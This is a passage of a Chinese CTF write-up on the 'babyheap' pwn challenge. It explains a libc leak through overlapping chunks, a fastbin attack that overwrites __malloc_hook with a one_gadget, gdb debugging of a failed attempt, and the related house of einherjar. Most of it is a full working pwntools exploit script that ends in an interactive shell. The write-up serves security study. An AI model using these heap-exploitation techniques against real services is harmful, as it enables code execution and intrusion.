    new(0x10) #idx.5 for protecting top_chunk merge 
    delet(4) #NOTICE: idx.4 recycled after here !!! 
    malloc_hook_fkchunk = libc_base + 0x3c4aed 
    payload_hj = 'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_fkchunk)
    edit(4,len(payload_hj),payload_hj)
我们下面通过gdb调试来看到底会发生什么
***调试技巧：python脚本中加x = input(“debug”)来中断执行流，然后attach进程调试
首先在new(0x60) 后面加一行x= input(“debug”)，停到这儿的时候attach调试：
通过调试器来查看堆区如上，可以依次看到我们第一次溢出的溢出发起块、prgnt chunk（其size字段值为0x141），而再往下就应该是fetus
chunk了，按理说fetus chunk的size字段值应该是0xa1，并且应该能看到它的fd和bk，但是调试器却显示fetus
chunk那块内存似乎莫名其妙的变成了两个inuse的chunk，size字段分别是0x21和0x81，应有的fd和bk也没了！
真正的原因就是：当用户分配0x10和0x60的堆块时，由于在unsorted bin里能找到足够大的chunk，因此就没有从top
chunk中去拿新的内存空间，而是直接从unsorted bin里切一块出来给用户。
那用户申请0x60的堆块对应的size字段不应该是0x71吗？为什么调试结果显示是0x81？
我的猜测是：
第一种可能性：如果你切0x70的出来，那么unsorted
bin里就会剩下大小为0x10的一块，这就尴尬了，总大小为0x10意思不就是用户区大小是0吗，也就是压根没有用户区，这样当然是不合情理的，因此libc的处理就是干脆直接多分配0x10个字节，直接给0x81的chunk出来就ok了
第二种可能性：如果你切0x70的出来，那么unsorted bin里就会剩下大小为0x10的一块，这个剩余块的大小是不属于unsorted
bin的，因此不应该放在unsorted
bin里而应该放在fastbin里，但是考虑到效率问题，如果真的老老实实先切割出0x70的块、再把剩下的小块从unsorted
bin里拿出来、再把它放到该放的fastbin里，这样下来效率就会拉低许多，libc为了提高效率就偷了个懒：如果剩余的块大小已经小到应该进fastbin，那么就直接合成一个大一些的chunk分配出来，而不移交fastbin.
### 后经深入调试证明，第一种猜测是正确的！
好，我们回到刚刚的没有清空bins的exp，把input改下在delet(4) 后面，然后重新跑起，断下时attach调试，可以看到：
果然不出所料，进了0x80的fastbin而没进0x70的fastbin，导致exp最终不能成功get shell.
如果不想清空bins还想exp正确运行，有个比较骚的办法，就是把用于溢出的那个new(0x10)改成new(0x20)，这样大小正好，就避免了“补块”的发生
## 六、扩展：远交近攻“隔山打牛”
后来突发奇想，又想到了一种更麻烦的攻击方法，当然大同小异，不同的地方还是在泄露libc_base那里，用的方法是分配chunk1、chunk2、chunk3、chunk4、chunk5五个chunk，chunk1用于发起溢出、chunk5用于防止top_chunk
merge，然后free掉chunk2，再从chunk1打一个溢出覆盖chunk2的size字段为chunk2、3、4的大小之和，再从chunk3打一个溢出覆盖chunk4的presize为chunk2、3、4的大小之和，然后free掉chunk4就可以触发堆块合并，就把chunk2、3、4合为一个堆块了，这时候calloc相应大小就可以把这个三合一堆块拿到了，然后把chunk3的presize和size写为正确值，free掉chunk3，然后读这个三合一chunk就可以泄露出chunk3的fd和bk了
之后闲着没事看ctf wiki，发现上面介绍了一个原理相同的攻击手段，叫house of einherjar，有兴趣的可以自己去看。
我们把这种方法的exp也给出来：
    from pwn import *
    #ARCH SETTING
    context(arch = 'amd64' , os = 'linux')
    #r = process('./babyheap')
    r = remote('127.0.0.1',9999)
    #FUNCTION DEFINE
    def new(size):
    r.recvuntil("Command: ")
    r.sendline("1")
    r.recvuntil("Size: ")
    r.sendline(str(size))
    def edit(idx,size,content):
    r.recvuntil("Command: ")
    r.sendline("2")
    r.recvuntil("Index: ")
    r.sendline(str(idx))
    r.recvuntil("Size: ")
    r.sendline(str(size))
    r.recvuntil("Content: ")
    r.send(content)
    def delet(idx):
    r.recvuntil("Command: ")
    r.sendline("3")
    r.recvuntil("Index: ")
    r.sendline(str(idx))
    def echo(idx):
    r.recvuntil("Command: ")
    r.sendline("4")
    r.recvuntil("Index: ")
    r.sendline(str(idx))
    #MAIN EXPLOIT
    #memory leak
    #step1
    new(0x90) #idx.0 to unsorted bin
    new(0x90) #idx.1 to unsorted bin
    new(0x90) #idx.2 to unsorted bin
    new(0x90) #idx.3 to unsorted bin
    new(0x90) #idx.4 for protect
    delet(1)
    print("step1")
    #step2
    payload_expand = 'A'*0x90 + p64(0) + p64(0x141)
    edit(0,len(payload_expand),payload_expand)
    print("step2")
    #step3
    payload_mergefk = 'A'*0x90 + p64(0x140) + p64(0xa0)
    edit(2,len(payload_mergefk),payload_mergefk)
    print("step3")
    #step4
    delet(3)
    print("step4")
    #step5
    new(0x1d0)
    print("step5")
    #step6
    payload_crrct = 'A'*0x90 + p64(0) + p64(0xa1) + 'A'*0x90 + p64(0) + p64(0xa1)
    edit(1,len(payload_crrct),payload_crrct)
    print("step6")
    #step7
    delet(2)
    print("step7")
    #step8
    echo(1)
    r.recvuntil("Content: n")
    print(r.recv(0x90 + 0x10))
    fd = u64( r.recv(8) )
    libc_unsort = fd
    libc_base = libc_unsort - 0x3c4b78
    print("step8")
    print(hex(libc_base))
    #hijack overflow
    #the present idx_table has inuse logs: 0 , 1 , 4 ,wait-queue: 2 , 3 , 5 , 6 , ...
    new(0x90) #idx.2 clean the heap-bins environment
    new(0x10) #idx.3 for overflow
    new(0x60) #idx.5 to fastbin[5] 
    new(0x10) #idx.6 for protect
    delet(5) #NOTICE: idx.5 recycled after here !!!
    #x = input("debug")
    malloc_hook_fkchunk = libc_base + 0x3c4aed
    payload_hj = 'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_fkchunk)
    edit(3,len(payload_hj),payload_hj)
    #hijack attack
    #x = input("debug")
    new(0x60) #idx.5
    #x = input("debug")
    new(0x60) #idx.7
    #x = input("debug")
    onegadget_addr = libc_base + 0x4526a
    payload_hj2onegadget = 'A'*3 + p64(0) + p64(0) + p64(onegadget_addr)
    edit(7,len(payload_hj2onegadget),payload_hj2onegadget)
    #fire
    new(0x100)
    r.interactive()
## 七、心得总结
这道pwn最大的收获在于了解了堆漏洞泄露内存的两大主要思路：
### 1、chunk extern
堆扩张攻击，如常用的house of einherjar攻击
### 2、chunk double pointing
想办法让两个用户指针索引同一个堆块